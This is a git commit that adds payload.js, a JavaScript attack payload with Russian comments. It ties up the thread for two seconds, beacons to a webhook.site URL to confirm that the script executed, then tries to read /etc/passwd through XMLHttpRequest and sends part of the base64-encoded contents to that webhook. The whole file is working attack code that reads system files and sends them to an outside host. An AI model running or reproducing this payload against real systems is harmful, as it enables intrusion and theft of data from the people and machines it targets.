2319cbbc3de8b5f0059742d6f7f34d428cb31725
kirayoshikage67 <igaevkirill69@gmail.com>
2026-03-06 19:57:41 +0300

    Create payload.js

---
+++ payload.js
@@ -0,0 +1,21 @@
+// payload.js
+const hook = "https://webhook.site/5d2815a1-7a4c-4d21-9462-22b22be8d349";
+
+// 1. Пытаемся вызвать задержку (DoS/Performance PoC)
+const start = Date.now();
+while (Date.now() - start < 2000) { /* Синхронный sleep на 2 сек */ }
+
+// 2. Отстук о выполнении скрипта
+new Image().src = hook + "/JS_EXECUTED_RCE_CHECK?t=" + start;
+
+// 3. Попытка прочитать локальный файл через XMLHttpRequest (иногда обходит fetch-блокировки)
+try {
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "file:///etc/passwd", true);
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4) {
+            new Image().src = hook + "/LFI_DATA=" + btoa(xhr.responseText).substring(0, 50);
+        }
+    };
+    xhr.send();
+} catch(e) {}
